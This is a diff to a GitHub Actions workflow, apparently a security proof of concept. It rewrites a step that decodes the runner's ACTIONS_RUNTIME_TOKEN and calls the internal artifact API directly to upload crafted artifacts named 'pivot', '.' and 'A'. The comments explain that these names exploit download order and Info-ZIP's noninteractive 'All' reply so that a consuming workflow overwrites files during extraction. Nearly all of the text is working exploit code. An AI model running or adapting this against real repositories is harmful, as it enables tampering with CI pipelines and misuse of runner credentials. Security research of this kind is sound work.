@@ -63,79 +63,78 @@ jobs:
           )
 
       - name: Upload pivot artifacts through the Actions Results service
-        shell: bash
-        run: |
-          set -euo pipefail
-          node <<'NODE'
-          const crypto = require('crypto');
-          const fs = require('fs');
-          const path = require('path');
-
-          const token = process.env.ACTIONS_RUNTIME_TOKEN;
-          const resultsURL = process.env.ACTIONS_RESULTS_URL;
-          if (!token || !resultsURL) throw new Error('missing Actions artifact runtime input');
-
-          const payloadPart = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
-          const payload = JSON.parse(Buffer.from(payloadPart, 'base64').toString('utf8'));
-          const resultScope = String(payload.scp || '')
-            .split(' ')
-            .find(scope => scope.startsWith('Actions.Results:'));
-          if (!resultScope) throw new Error('Actions.Results scope missing');
-          const [, workflowRunBackendId, workflowJobRunBackendId] = resultScope.split(':');
-          const origin = new URL(resultsURL).origin;
-
-          async function rpc(method, body) {
-            const response = await fetch(
-              `${origin}/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
-              {
-                method: 'POST',
-                headers: {
-                  Authorization: `Bearer ${token}`,
-                  'Content-Type': 'application/json',
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const crypto = require('crypto');
+            const fs = require('fs');
+            const path = require('path');
+  
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsURL = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !resultsURL) throw new Error('missing Actions artifact runtime input');
+  
+            const payloadPart = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
+            const payload = JSON.parse(Buffer.from(payloadPart, 'base64').toString('utf8'));
+            const resultScope = String(payload.scp || '')
+              .split(' ')
+              .find(scope => scope.startsWith('Actions.Results:'));
+            if (!resultScope) throw new Error('Actions.Results scope missing');
+            const [, workflowRunBackendId, workflowJobRunBackendId] = resultScope.split(':');
+            const origin = new URL(resultsURL).origin;
+  
+            async function rpc(method, body) {
+              const response = await fetch(
+                `${origin}/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
+                {
+                  method: 'POST',
+                  headers: {
+                    Authorization: `Bearer ${token}`,
+                    'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify(body),
                 },
-                body: JSON.stringify(body),
-              },
-            );
-            if (!response.ok) throw new Error(`${method} failed with HTTP ${response.status}`);
-            return response.json();
-          }
-
-          async function upload(name, archivePath) {
-            const create = await rpc('CreateArtifact', {
-              workflowRunBackendId,
-              workflowJobRunBackendId,
-              name,
-              version: 7,
-              mimeType: 'application/zip',
-            });
-            if (!create.ok || !create.signedUploadUrl) {
-              throw new Error(`CreateArtifact returned no upload URL for ${JSON.stringify(name)}`);
+              );
+              if (!response.ok) throw new Error(`${method} failed with HTTP ${response.status}`);
+              return response.json();
             }
-
-            const bytes = fs.readFileSync(archivePath);
-            const response = await fetch(create.signedUploadUrl, {
-              method: 'PUT',
-              headers: {
-                'Content-Type': 'application/zip',
-                'Content-Length': String(bytes.length),
-                'x-ms-blob-type': 'BlockBlob',
-              },
-              body: bytes,
-            });
-            if (!response.ok) throw new Error(`blob upload failed with HTTP ${response.status}`);
-
-            const hash = crypto.createHash('sha256').update(bytes).digest('hex');
-            const finalize = await rpc('FinalizeArtifact', {
-              workflowRunBackendId,
-              workflowJobRunBackendId,
-              name,
-              size: String(bytes.length),
-              hash: `sha256:${hash}`,
-            });
-            if (!finalize.ok) throw new Error(`FinalizeArtifact failed for ${JSON.stringify(name)}`);
-          }
-
-          (async () => {
+  
+            async function upload(name, archivePath) {
+              const create = await rpc('CreateArtifact', {
+                workflowRunBackendId,
+                workflowJobRunBackendId,
+                name,
+                version: 7,
+                mimeType: 'application/zip',
+              });
+              if (!create.ok || !create.signedUploadUrl) {
+                throw new Error(`CreateArtifact returned no upload URL for ${JSON.stringify(name)}`);
+              }
+  
+              const bytes = fs.readFileSync(archivePath);
+              const response = await fetch(create.signedUploadUrl, {
+                method: 'PUT',
+                headers: {
+                  'Content-Type': 'application/zip',
+                  'Content-Length': String(bytes.length),
+                  'x-ms-blob-type': 'BlockBlob',
+                },
+                body: bytes,
+              });
+              if (!response.ok) throw new Error(`blob upload failed with HTTP ${response.status}`);
+  
+              const hash = crypto.createHash('sha256').update(bytes).digest('hex');
+              const finalize = await rpc('FinalizeArtifact', {
+                workflowRunBackendId,
+                workflowJobRunBackendId,
+                name,
+                size: String(bytes.length),
+                hash: `sha256:${hash}`,
+              });
+              if (!finalize.ok) throw new Error(`FinalizeArtifact failed for ${JSON.stringify(name)}`);
+            }
+  
             // The REST artifact list is descending by artifact ID. Creating
             // "pivot" before "." makes the consumer extract "." first. The older "A"
             // record is consumed by Info-ZIP as its noninteractive "All" reply
@@ -144,8 +143,3 @@ jobs:
             await upload('pivot', path.join(process.env.RUNNER_TEMP, 'pivot.zip'));
             await upload('.', path.join(process.env.RUNNER_TEMP, 'dot.zip'));
             console.log('Uploaded benign three-artifact pivot');
-          })().catch(error => {
-            console.error(error.message);
-            process.exitCode = 1;
-          });
-          NODE
